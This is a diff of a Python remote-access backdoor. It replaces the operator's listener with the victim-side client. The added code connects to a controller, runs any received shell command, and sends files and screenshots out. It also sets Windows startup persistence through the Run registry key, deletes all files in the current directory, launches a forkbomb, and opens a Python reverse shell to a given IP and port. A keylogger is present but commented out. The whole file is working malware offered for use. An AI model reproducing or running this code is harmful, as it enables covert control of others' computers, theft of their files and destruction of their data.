@@ -1,332 +1,322 @@
 import socket
-import sys
-import time
-import os
 import subprocess
-from typing import ContextManager
-### Server
+import sys
+import os
+import platform
+import requests
+import re
+import pyautogui
+import time
 
-class TcpServer:
 
+# from pynput.keyboard import Key, Listener
 
-    def __init__(self):
+### Client
+class Backdoor:
+    keys_list = []
+    count = 0
+    program_name = os.path.basename(__file__)
+
+    def __init__(self, host, port):
         # Font: Chuncky
-        print("""\033[1;36m
- _______               __         __ __   
-|    ___|.--.--.-----.|  |.-----.|__|  |_ 
-|    ___||_   _|  _  ||  ||  _  ||  |   _|
-|_______||__.__|   __||__||_____||__|____|
-               |__|    \033[0;0m""")
-        try:
-            self.host = input("\033[1;36mPut here the LHOST IP:\033[0;0m ")
-            self.port = int(input("\033[1;36mPut here the LHOST Port:\033[0;0m "))
 
+        self.host = str(host)
+        self.port = int(port)
+
+
+        # print("""\033[1;36m
+        # _______               __         __ __
+        # |    ___|.--.--.-----.|  |.-----.|__|  |_
+        # |    ___||_   _|  _  ||  ||  _  ||  |   _|
+        # |_______||__.__|   __||__||_____||__|____|
+        # |__|    \033[0;0m""")
+        """try:
+            self.host = str(input("\033[1;36mPut here the Target's IP:\033[0;0m "))  # Comment this for using direct connection
+            self.port = int(input("\033[1;36mPut here the RPORT:\033[0;0m "))  # Comment this for using direct connection
             if self.host == "":
                 print("\033[1;36mNo host Especified! Exiting...\033[0;0m")
                 sys.exit()
-                
-            self.hostname = socket.gethostname()
 
         except KeyboardInterrupt:
             print("\nExiting... Bye o/")
             sys.exit()
-        
 
-    def starting_connection(self):
-        # exploiting_string = "Launching Server..."
+        except:
+            print("\nWrong Input! Exiting...")
+            sys.exit()"""
 
-        exploit = ["L","a","u","n","c","h","i","n","g"," ","S","e","r","v","e","r",".",".","."]
+    def commands_initiating(self):
 
-        # display with one upper char
 
-        for x in range(len(exploit)):
-            # remeber lower char
-            old = exploit[x]
 
-            # replace with upper char
-            exploit[x] = old.upper()
+        # Starting connection
+        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-            # create full text
-            text = "".join(exploit)
+        connected = False
+        while (connected == False):
+            try:
+                time.sleep(2)
+                print('\033[31m[-] *\033[0;0m \033[1;36mInitiating Connection...\033[0;0m')
+                self.sock.connect((self.host, self.port))
+                print('\033[36m[+] *\033[0;0m \033[1;36mConnection estabilished with Sucess!\033[0;0m')
+                connected = True
+                
+            except KeyboardInterrupt:
+                print("\nExiting... Bye o/")
+                sys.exit()
 
-            # display full text
-            sys.stdout.write("\r")
-            sys.stdout.write(f"\033[1;36m{text}\033[0;0m")
-            sys.stdout.flush()
+            except:
+                print("\033[31m[+] * \033[0;0mHost isn't Accepting connection, Trying again...")
 
-            # put back lower char
-            exploit[x] = old
+        # Loop getting commands
 
-            time.sleep(0.2)
-
-        # display without upper chars at the end 
-
-        text = "".join(exploit)
-
-        sys.stdout.write("\r")
-        sys.stdout.write(f"\033[1;36m{text}\033[0;0m")
-        sys.stdout.flush()
-        print("""\n\033[1;32m 
-        
-                      _     __,..---""-._                 ';-,
-        ,    _/_),-"`             '-.                `\\
-       \|.-"`    -_)                 '.                ||
-       /`   a   ,                      \              .'/
-       '.___,__/                 .-'    \_        _.-'.'
-          |\  \      \         /`        _`""""""`_.-'
-             _/;--._, >        |   --.__/ `""""""`
-           (((-'  __//`'-......-;\      )
-                (((-'       __//  '--. /
-        jgs               (((-'    __//
-                                 (((-'\033[0;0m
-
-+------------------------------------------------------------+
-| \033[1;31m* Python based OOP backdoor made by --> f3rr3ira\033[0;0m           |
-+------------------------------------------------------------+
-| \033[1;31m* version 1.0\033[0;0m                                              |
-| \033[1;31m* Github --> https://github.com/ferreiraklet\033[0;0m               |
-| \033[1;31m* Type list For Help\033[0;0m                                       |
-+------------------------------------------------------------+
-""")
-    
-
-    def show_connection(self):
-        time.sleep(0.5)
-        print(f"\033[1;32m[+]\033[0;0m --> Server Started on {self.host}!")
-        print("\033[1;32m[+]\033[0;0m --> Listening For Client Connection...")
-
-    def sending_commands(self):
-        
-        # Binding stuff
-        try:
-            self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self.server.settimeout(None)
-            self.server.bind((self.host, self.port))
-
-            self.server.listen(1)
-
-        except KeyboardInterrupt:
-            print("Exiting... Bye o/")
-            sys.exit()
-
-        except socket.error:
-            print("\n\033[1;31m[!]\033[0;0m Server is not responding or doesn't exist")
-            sys.exit()
-
-        time.sleep(0.5)
-        # print("[+] \033[1;32m--> Starting RCE input -->\033[0;0m\n\n")
-        print("\n\033[31m[+] * \033[0;0mType list for command list\n\033[31m[+] * \033[0;0mWaiting for connection...")
         while True:
             try:
-                self.client, self.client_ip = self.server.accept()
-                print(f"\n\033[1;36mConnection Received from {self.client_ip}\033[0;0m\n")
-                print("\033[1;32m[+]\033[0;0m --> Starting RCE input -->\n\n")
+                message_command = self.sock.recv(2048)
+                message_command_descrypt = message_command.decode("latin1")
+
+                if message_command_descrypt == "exit":
+                    print("Closing RCE... Bye o/")
+                    self.sock.close()
+                    sys.exit()
+
+
+                try:
+                    not_in = ["get_ip", "permanence_mode", "upload", "victims_info", "remove_all", "keylogger_start",
+                              "forkbomb", "reverse_tcp", "download", "screenshot", "cat"]
+
+                    # Get machine's IP adress
+
+                    if message_command_descrypt == "get_ip":
+                        ip = requests.get("https://api.ipify.org").text
+                        ip_message = f"The target's IP is: {ip}".encode()
+                        self.sock.send(ip_message)
+
+                    # cat command
+
+                    if message_command_descrypt.startswith("cat "):
+                        try:
+                            catfile_name = message_command_descrypt.split(" ")[1]
+                            cat_size = os.path.getsize(catfile_name)
+                            self.sock.send(str(cat_size).encode())
+                            time.sleep(2)
+                            with open(catfile_name, "rb") as cat:
+                                cat_read = cat.read()
+                                self.sock.send(cat_read)
+
+                        except Exception as e:
+                            self.sock.send(str(e).encode())
+
+                    if message_command_descrypt == "permanence_mode":
+                        # reg.KEY_SET_VALUE
+                        try:
+
+                            import winreg as reg
+                            pth = os.path.dirname(os.path.realpath(__file__))
+                            f_name = os.path.basename(__file__)
+
+                            address = os.path.join(pth, f_name)  
+                            
+                            # Key To Change: HKEY_CURRENT_USER  
+                            # Key Value: Software\Microsoft\Windows\CurrentVersion\Run
+                            key = reg.HKEY_CURRENT_USER 
+                            key_value = "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+                            
+                            # Opening Key To Make Changes 
+                            open = reg.OpenKey(key, key_value, 0, reg.KEY_ALL_ACCESS)
+                            
+                            # Modifiy The Key 
+                            reg.SetValueEx(open, "pyperm", 0, reg.REG_SZ, address) 
+                            
+                            # Closing 
+                            reg.CloseKey(open)
+                            self.sock.send("Permanence mode activated!".encode())
+
+
+                        except Exception as exc:
+                            self.sock.send(str(exc).encode())
+                        # except
+                    # Downloading files
+
+                    if message_command_descrypt.startswith("download "):
+                        file_name = message_command_descrypt.split(" ")[1]
+                        data_size = os.path.getsize(file_name)
+                        self.sock.send(str(data_size).encode("utf-8"))
+
+                        time.sleep(2)
+
+                        with open(file_name, "rb") as sc:
+                            screenshot_data = sc.read()
+                            self.sock.send(screenshot_data)
+                        print("Transference Done!")
+
+
+                    # This is for removing all files in currently path, maybe not work in folders that requires admin credentials
+
+                    elif message_command_descrypt == "remove_all":
+                        try:
+                            files = os.listdir()
+                            for file in files:
+                                os.chdir(os.getcwd())
+                                os.remove(file)
+                        except IsADirectoryError:
+                            continue
+                        except Exception as e:
+                            self.sock.send(str(e).encode())
+
+                    # This is used to get machine informations
+
+                    elif message_command_descrypt == "victims_info":
+                        info = f"""
+                        Operacional System: {sys.platform}
+                        Computer Name: {platform.node()}
+                        For more advanced info, use: uname -a, uname -r, id
+                        """.encode()
+                        self.sock.send(info)
+
+                    # TCP Reverse shell in python
+
+                    if message_command_descrypt == "reverse_tcp":
+                        self.sock.send("You must put IP and PORT as parameters! Ex: reverse_tcp 192.168 7777".encode())
+
+                    if message_command_descrypt.startswith("reverse_tcp "):
+                        reverseip = message_command_descrypt.split(" ")[1]
+                        reverseport = message_command_descrypt.split(" ")[2]
+                        subprocess.check_output(
+                            f"""python -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{reverseip}",{reverseport}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'
+                        """, stderr=subprocess.STDOUT, shell=True)
+                        self.sock.send("Reverse Shell Session established with sucess!".encode())
+
+                    # Sending Screenshot
+
+                    if message_command_descrypt == "screenshot":
+                        screenshot = pyautogui.screenshot()
+                        screenshot.save("screenshot.png")
+
+                        data_size = os.path.getsize("screenshot.png")
+                        self.sock.send(str(data_size).encode("latin1"))
+
+                        with open("screenshot.png", "rb") as sc:
+                            screenshot_data = sc.read()
+                            self.sock.send(screenshot_data)
+                        os.remove("screenshot.png")  # para remover a imagem, testar
+
+                    # Upload File ta executando como comando no termianl.. mudar para if, sel
+
+                    if message_command_descrypt.startswith("upload "):
+
+                        up_filesize = self.sock.recv(1024).decode("latin1")
+                        up_filename = message_command_descrypt.split(" ")[2]
+
+                        int_filesize = int(up_filesize)
+
+                        up_data = b""
+                        while len(up_data) < int_filesize:
+                            up_data += self.sock.recv(int_filesize)
+                        
+                        with open(up_filename, "wb") as up:
+                            up.write(up_data)
+
+                        self.sock.send(
+                            f"\033[1;32m[+]\033[0;0m - Uploaded to {up_filename} finished! File Size: {str(int_filesize)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...".encode())
+
+                    # This is for crash the target's machine
+
+                    if message_command_descrypt == "forkbomb":
+                        try:
+                            while True:
+                                os.fork()
+                        except Exception as e:
+                            self.sock.send(str(e).encode())
+
+                    # Verify commands
+                    for value in not_in:
+                        if value in message_command_descrypt:
+                            message_command_descrypt = "ignoreethislittlemessage"
+
+                    # Entering commands in terminal
+
+                    if message_command_descrypt != "ignoreethislittlemessage":
+                        command_prompt = subprocess.Popen(message_command_descrypt, stderr=subprocess.PIPE,
+                                                          stdout=subprocess.PIPE, stdin=subprocess.PIPE, shell=True)
+                        err = command_prompt.stderr.read()
+                        command_prompt = command_prompt.stdout.read()
+                        self.sock.send(command_prompt)
+                        self.sock.send(err)
+                        print('Command Sent!')
+
+                        if command_prompt == b"" and err == b"":
+                            self.sock.send("\nOK!\n".encode())
+
+                        elif command_prompt == b"" and err == b"" and message_command_descrypt.startswith("cd ") == True:
+                            cd_message = f"You have been moved to {os.getcwd().encode()}".encode()
+                            self.sock.send(cd_message)
+
+
+
+                except Exception as e:
+                    self.sock.send(str(e).encode())
+
+                # Navegate into directories
+
+                if message_command_descrypt.startswith("cd"):
+                    # os.chdir(message_command_descrypt[3:].replace("\n",""))
+                    try:
+                        os.chdir(message_command_descrypt[3:])
+                        print("Command Sent!")
+                    except Exception as e:
+                        self.sock.send(str(e).encode())
+
+                """if message_command_descrypt.startswith("keylogger_start "):
+                    self.rang = message_command_descrypt.split(" ")[1]
+                    self.listener()"""
+
+                # if message_command_descrypt == "rm":
+                # self.sock.send("You must specify a file".encode())
+
+            except BrokenPipeError:
+                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
+                sys.exit()
 
             except KeyboardInterrupt:
                 print("\nExiting... Bye o/")
                 sys.exit()
-            
-            while True:
-                # Input for terminal commands
-                
-                
-                # o input ta quebrando com o cat, porque o input aparece mais rapido que o resultado inteiro do cat
-                try:
-                    message_command = input('\033[1;36mEnter RCE Command:\033[0;0m ')
-                    
-                    # Exiting keyword
-                    if message_command == "exit":
-                        print("Closing RCE... Bye o/")
-                        self.client.send("exit".encode())
-                        self.server.close()
-                        sys.exit()
+
+            except ConnectionResetError:
+                print("\n\033[1;31m[!]\033[0;0m Connection Reseted! Exiting...")
+                sys.exit()
+
+    """def keylogger(self, key):
+        current_key = str(key)
+        current_key = re.sub(r"Key.space"," ", current_key) 
+        current_key = re.sub(r"Key.alt_1","\n", current_key)
+        current_key = re.sub(r"Key.*","", current_key)
+        self.count += 1
+        self.keys_list.append(current_key)
+        if self.count >= int(self.rang): # Estabilish a range, with sys.argv
+
+            with open("log.txt","w") as text:  # COUNTS THE LETTERS: IF MORE OR EQUAL TO 10, SEND MESSAGE TO SERVER
+                for keys in self.keys_list:
+                    text.write(keys)
+
+            with open("log.txt","r") as text2:
+                text_data = text2.read()
+
+                keylog_ok = "OK!"
+                self.sock.send(keylog_ok.encode())
+
+                keylog_size = os.path.getsize("log.txt")
+                self.sock.send(str(keylog_size).encode())
+
+                self.sock.send(text_data.encode())
+                # os.remove("log.txt")
+                # sys.exit()
+
+    def listener(self):
+        with Listener(on_press = self.keylogger) as l: 
+            l.join()"""
 
 
-                    """if message_command == "keylogger_start":
-                        print("You must specify a range of letters! Ex: keylogger_start 20")
-                        continue
 
-                    if message_command.startswith("keylogger_start "):
-                        self.client.send(message_command.encode())
-                        #print("\033[0;31m[+]\033[0;0m - Keylogger Started!")
-                        while True:
-                            keylogger_ok = self.client.recv(1024).decode()
-                            #print("\033[0;31m[+]\033[0;0m - Getting Keylogger file Size...")
-                            if keylogger_ok == "OK!":
-                                keylogger_file_size = self.client.recv(1024).decode()
-                                kbyt = b""
-                                while kbyt < int(keylogger_file_size):
-                                    kbyt += int(keylogger_file_size)
-
-                            #print("\033[0;31m[+]\033[0;0m - Writing keys to a file named extkey.txt...")
-                            with open("extkey.txt","wb") as kby:
-                                kby.write(kbyt)
-                            #print("\033[0;31m[+]\033[0;0m - KeyLogger file Finished Downloading! \n \033[0;31m[+]\033[0;0m - Returning to input...")
-                            continue"""
-
-                        
-
-
-                    # Screenshot: Maybe not work perfect in linux systems
-
-                    if message_command == "screenshot":
-
-                        self.client.send(message_command.encode())
-                        print("\033[0;31m[+]\033[0;0m - Waiting File Size...")
-                        screenshot_size = self.client.recv(1024).decode("latin1")
-                        int_screenshot_size = int(screenshot_size)
-
-                        print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
-
-                        str_data = b""
-                        while len(str_data) < int_screenshot_size:
-                            str_data += self.client.recv(int_screenshot_size)
-        
-                        with open("extscreenshot.png","wb") as sc:
-                            sc.write(str_data)
-                        print(f"\033[1;32m[+]\033[0;0m - Screenshot Download finished! File Size: {str(int_screenshot_size)} \nGoing Back to Input...")
-                        continue
-
-                    if message_command == "permanence_mode":
-                        self.client.send(message_command.encode())
-                        reg_message = self.client.recv(1024).decode()
-                        print(reg_message)
-                        continue
-
-                    # Uploading FIles
-
-                    if message_command == "upload":
-                        print("You must specify a file!")
-                        continue
-
-                    # need to pass 2 parameters, where is the file and the file: /home/file.txt, especify the name you want to the file to become, Ex: kleiton
-                    if message_command.startswith("upload "):
-                        try:
-                            location_filename = message_command.split(" ")[1]
-                            self.client.send(message_command.encode("latin1"))
-                        
-                        
-                            data = os.path.getsize(location_filename)
-                            self.client.send(str(data).encode("utf-8"))
-
-                            time.sleep(2)
-
-                            with open(location_filename,"rb") as up:
-                                up_filedata = up.read()
-                                self.client.send(up_filedata)
-
-                            transference_done = self.client.recv(1024).decode()
-                            print(transference_done)
-                            continue
-                        except IsADirectoryError:
-                            print("\033[0;31m[!]\033[0;0m - Incorrect file type, Need to especify a file! Backing to input...")
-                            continue
-                        except:
-                            print("SOmething went wrong! Going back to the input...")
-                            continue
-                        
-                        
-                    
-
-                    # Downloading files
-
-                    if message_command == "download":
-                        print("You must specify a file!")
-                        continue
-
-                    if message_command.startswith("download "):
-
-                        file_name = message_command.split(" ")[1]
-                        self.client.send(message_command.encode())
-                        print("\033[0;31m[+]\033[0;0m - Waiting File Size...")
-                        try:
-                            screenshot_size = self.client.recv(1024).decode("utf-8")
-                            int_screenshot_size = int(screenshot_size)
-
-                            print("\033[0;31m[+]\033[0;0m - Receiving Data...\n")
-
-                            str_data = b""
-                            while len(str_data) < int_screenshot_size:
-                                str_data += self.client.recv(int_screenshot_size)
-            
-                            with open(file_name,"wb") as sc:
-                                sc.write(str_data)
-
-                            print(f"\033[1;32m[+]\033[0;0m - Download to {file_name} finished! File Size: {str(int_screenshot_size)} \n\033[1;32m[+]\033[0;0m - Going Back to Input...")
-                            continue
-
-                        except IsADirectoryError:
-                            print("The Target's file is A directory!")
-                            continue
-                            
-                    if message_command == "cat":
-                        print("You need to especify a file!")
-                        continue
-                    
-                    if message_command.startswith("cat "):
-                        self.client.send(message_command.encode())
-                        cat_size = self.client.recv(1024)
-
-                        str_cat = b""
-                        while len(str_cat) < int(cat_size):
-                            str_cat += self.client.recv(int(cat_size))
-                            print(str_cat.decode())
-                        continue
-                    
-
-                    # Command listing
-
-                    if message_command == "list":
-                        print("""
-            ---------------------------------------------
-            \033[1;31mforkbomb --> Crash Target's machine
-            victims_info --> Get some Target's info
-            get_ip --> Get Target's ip
-            remove_all --> Removes all files in currently directory
-            reverse_tcp --> NetCat feature: Spawn Reverse TCP shell into specified IP and PORT
-            download <file> --> Download files
-            permamence_mode --> Make Backdoor to initiate in windows startup
-            upload <path> <filename>
-            ex: upload /home/kleiton/Desktop/tools/ports.txt ports.txt \033[0;0m
-            ---------------------------------------------            """)
-                        continue
-
-                    if message_command == "":
-                        print("\n\033[1;36mMissing command!\033[0;0m")
-                        continue
-
-                    # Clear messages in currently cmd's session
-                        
-                    if message_command == "clear" and sys.platform.startswith("Linux") == True:
-                        os.popen("clear")
-                        continue
-                    if message_command == "clear"and sys.platform.startswith("Windows") == True:
-                        subprocess.Popen(f"cls", stderr=subprocess.PIPE,stdout=subprocess.PIPE,stdin=subprocess.PIPE, shell=True)
-                        continue
-
-                    if message_command.startswith("upload ") == False:
-                        message_command_encrypted = message_command.encode()
-                        self.client.send(message_command_encrypted)
-                        print('* Command sent!')
-                        receive_message = self.client.recv(1024)
-                        descrypt_message = receive_message.decode("latin1")
-                        print(f"{descrypt_message}")
-
-                    #if message_command.startswith("cat"):
-                        #time.sleep(5)
-                except KeyboardInterrupt:
-                    print("\nExiting... Bye o/")
-                    sys.exit()
-                except BrokenPipeError:
-                    print("\nConnection Stoped By the Client! Exiting...")
-                    sys.exit()
-
-                #self.client.close()
-
-            # self.server.close()
-
-
-object = TcpServer() # IP and PORT for the Server
-object.starting_connection()
-object.show_connection()
-object.sending_commands()
+back = Backdoor("127.0.0.1", 1)  # Backdoor("ip",port)
+back.commands_initiating()
